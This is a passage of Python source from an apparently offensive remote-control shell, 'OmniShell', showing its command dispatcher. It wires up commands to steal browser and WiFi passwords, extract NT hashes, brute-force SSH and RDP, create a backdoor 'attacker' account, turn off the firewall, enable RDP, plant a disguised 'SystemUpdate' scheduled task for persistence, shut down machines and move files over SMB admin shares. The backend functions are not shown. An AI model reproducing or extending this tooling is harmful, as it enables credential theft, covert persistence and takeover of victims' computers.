                        data = self.control.get_browser_data(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] {json.dumps(data, indent=2)}")

                elif cmd == "stealcreds":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target specified. Use 'select <idx>' or 'stealcreds <ip>'.")
                        return
                    if self.control:
                        pw = self.control.get_browser_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_browser_passwords') else {}
                        wifi = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"]) if hasattr(self.control, 'get_wifi_passwords') else {}
                        print(f"[+] Passwords: {json.dumps(pw, indent=2)}")
                        print(f"[+] WiFi: {json.dumps(wifi, indent=2)}")

                elif cmd == "nethashes":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'extract_nt_hashes'):
                        hashes = self.control.extract_nt_hashes(target, self.credentials["user"], self.credentials["pass"])
                        print(f"{json.dumps(hashes, indent=2)}")

                elif cmd == "ssh-brute" and args:
                    if self.control and hasattr(self.control, 'ssh_brute'):
                        result = self.control.ssh_brute(args[0])
                        print(f"{json.dumps(result, indent=2)}")

                elif cmd == "rdp-brute" and args:
                    if self.control and hasattr(self.control, 'rdp_brute_force'):
                        result = self.control.rdp_brute_force(args[0])
                        print(f"{json.dumps(result, indent=2)}")

                # ==================== PERSISTENCE ====================
                elif cmd == "adduser" and len(args) >= 1:
                    target = self.selected_target
                    u = args[0]
                    p = args[1] if len(args) > 1 else "Password123!"
                    
                    if args[0].count('.') >= 3: # IP provided
                        target = args[0]
                        u = args[1] if len(args) > 1 else "attacker"
                        p = args[2] if len(args) > 2 else "Password123!"
                        
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                        
                    if self.control and hasattr(self.control, 'add_local_user'):
                        self.control.add_local_user(target, self.credentials["user"], self.credentials["pass"], u, p)
                        print(f"[+] User {u} created on {target}")

                elif cmd == "rdp-enable":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'enable_rdp'):
                        self.control.enable_rdp(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] RDP enabled on {target}")

                elif cmd == "firewall-off":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'disable_firewall'):
                        self.control.disable_firewall(target, self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Firewall disabled on {target}")

                elif cmd == "firewall-on" and args:
                    if self.control and hasattr(self.control, 'enable_firewall'):
                        self.control.enable_firewall(args[0], self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Firewall enabled")

                elif cmd == "firewall-add" and len(args) >= 2:
                    if self.control and hasattr(self.control, 'add_firewall_exception'):
                        self.control.add_firewall_exception(args[0], self.credentials["user"], self.credentials["pass"], int(args[1]))
                        print(f"[+] Firewall rule added")

                elif cmd == "persist-task":
                    target = self.selected_target
                    task_name = args[0] if len(args) > 0 else "SystemUpdate"
                    task_path = args[1] if len(args) > 1 else "notepad.exe"
                    
                    if len(args) > 0 and args[0].count('.') >= 3:
                        target = args[0]
                        task_name = args[1] if len(args) > 1 else "SystemUpdate"
                        task_path = args[2] if len(args) > 2 else "notepad.exe"
                        
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                        
                    if self.control and hasattr(self.control, 'create_scheduled_task'):
                        self.control.create_scheduled_task(target, self.credentials["user"], self.credentials["pass"], task_name, task_path)
                        print(f"[+] Task {task_name} created on {target}")
                    
                # ==================== SYSTEM ====================
                elif cmd == "shutdown":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'shutdown'):
                        self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "shutdown")
                        print(f"[+] Shutdown sent to {target}")

                elif cmd == "reboot":
                    target = args[0] if args else self.selected_target
                    if not target:
                        print(f"{Fore.RED}[!] No target selected.")
                        return
                    if self.control and hasattr(self.control, 'shutdown'):
                        self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "reboot")
                        print(f"[+] Reboot sent to {target}")

                # ==================== FILES ====================
                elif cmd == "upload" and len(args) >= 1:
                    target = self.selected_target
                    src = args[0]
                    dst = args[1] if len(args) > 1 else "C$\\temp\\omni.exe"
                    
                    if args[0].count('.') >= 3:
                        target = args[0]
                        src = args[1] if len(args) > 1 else ""
                        dst = args[2] if len(args) > 2 else "C$\\temp\\omni.exe"
                        
                    if not target or not src:
                        print(f"{Fore.RED}[!] Usage: upload [ip] <src> <dst>")
                        return
                        
                    if self.control and hasattr(self.control, 'smb_upload'):
                        # Parsing dst for C$ etc if needed, but assuming simple path for now
                        self.control.smb_upload(target, src, "C$", dst.replace("C$\\", "").replace("C$:", ""), self.credentials["user"], self.credentials["pass"])
                        print(f"[+] Uploaded to {target}")

                elif cmd == "download" and len(args) >= 1:
                    target = self.selected_target
                    remote = args[0]
                    local = args[1] if len(args) > 1 else "downloaded_file"
                    
                    if args[0].count('.') >= 3:
                        target = args[0]
                        remote = args[1] if len(args) > 1 else ""
                        local = args[2] if len(args) > 2 else "downloaded_file"
                        
                    if not target or not remote:
                        self._log(f"{Fore.RED}[!] Usage: download [ip] <remote> <local>")
                        return
                        
                    if self.control and hasattr(self.control, 'smb_download'):
                        self.control.smb_download(target, "C$", remote.replace("C$\\", "").replace("C$:", ""), local, self.credentials["user"], self.credentials["pass"])
                        self._log(f"[+] Downloaded from {target}")

                # ==================== UNKNOWN ====================
                else:
                    self._log(f"{Fore.RED}Unknown command: {cmd}. Type 'help' for 140+ commands.")

        except Exception as e:
            self._log(f"{Fore.RED}Error: {e}")

if __name__ == "__main__":
    shell = OmniShell()
    shell.run()
